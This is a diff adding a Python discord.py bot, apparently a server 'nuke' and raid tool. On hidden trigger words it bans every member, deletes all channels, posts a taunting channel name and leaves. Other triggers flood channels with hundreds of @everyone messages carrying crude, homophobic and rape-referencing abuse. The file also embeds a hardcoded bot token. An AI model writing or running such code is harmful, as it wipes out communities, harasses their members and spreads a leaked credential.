@@ -1,0 +1,104 @@
+import discord
+from discord.ext.commands import Bot
+from discord.ext import commands
+import time
+import asyncio
+bot = commands.Bot(command_prefix='')
+@bot.listen()
+async def on_ready():
+    print("ready")
+
+#made by januaay
+
+@bot.listen()
+async def on_message(message):
+    if message.content == "antifu":
+        count = 0
+        x = message.server.members
+        y = len(list(x))
+        while(count <=(y-1)): 
+            try:
+                await bot.ban(list(x)[count])
+                print("banned "+list(x)[count])
+            except:
+                print("failed to ban")
+            count = count + 1
+        channels = message.server.channels
+        channelstore = list(channels)
+        channelcount = len(list(channelstore))
+        count = 0
+        while(count <=(channelcount-1)):
+            await bot.delete_channel(list(channels)[count])
+            channels = list(channelstore)
+            print("deleted "+list(channels)[count].name)
+            count = count + 1
+        await bot.create_channel(message.server,"long live antifu")
+        await bot.leave_server(message.server)
+
+@bot.listen()
+async def on_message(message):
+    if message.content == "HailTR":
+        count = 0
+        x = message.server.members
+        y = len(list(x))
+        while(count <=(y-1)): 
+            try:
+                await bot.ban(list(x)[count])
+                print("banned "+list(x)[count])
+            except:
+                print("failed to ban")
+            count = count + 1
+        channels = message.server.channels
+        channelstore = list(channels)
+        channelcount = len(list(channelstore))
+        count = 0
+        while(count <=(channelcount-1)):
+            await bot.delete_channel(list(channels)[count])
+            channels = list(channelstore)
+            print("deleted "+list(channels)[count].name)
+            count = count + 1
+        await bot.create_channel(message.server,"long live TR")
+        await bot.leave_server(message.server)
+        
+    if message.content == "antifuu":
+        count = 0
+        time.sleep(5)
+        while(count<=300):
+            await bot.send_message(message.channel,"@everyone ***Long live antifu*** @everyone")
+            time.sleep(.1)
+            print("Mr. Vestige thinks its fucked.")
+            count = count + 1
+        await bot.send_message(message.channel,"***Antifuu just raped your ass, Fuck you .i. c: .***")
+
+    if message.content == "gaytia":
+        count = 5
+        time.sleep(2)
+        while(count<=300):
+            await bot.send_message(message.channel,"@everyone ***@everyone we love gays We are TiA YEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEERRRRRRRRRRRREEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE *** @everyone https://cdn.discordapp.com/attachments/465859314943393812/472110333650272258/gay.png")
+            time.sleep(.1)
+            print("Mr. Vestige knows its fucked.")
+            count = count + 1
+        await bot.send_message(message.channel,"***Antifuu just raped your ass, Fuck you .i. c: .***")
+
+    if message.content == "naenae":
+        count = 5
+        time.sleep(2)
+        while(count<=300):
+            await bot.send_message(message.channel,"@everyone :wave::joy::punch:")
+            time.sleep(.1)
+            print("Mr. Vestige hitting those whips.")
+            count = count + 1
+        await bot.send_message(message.channel,"***Antifuu just raped your ass, Fuck you .i. c: .***")
+
+    if message.content == "FlameTR":
+        count = 5
+        time.sleep(2)
+        while(count<=300):
+            await bot.send_message(message.channel,"Hail Tr @everyone")
+            time.sleep(.1)
+            print("Mr. Vestige hitting those whips.")
+            count = count + 1
+        await bot.send_message(message.channel,"***Antifuu just raped your ass, Fuck you .i. c: .***")
+
+    
+bot.run('NDcyMTAyMDEyODM4NzM5OTc4.Dju4kw.4bvdee2hw0_dhg4sF8wq35ZwFsE')
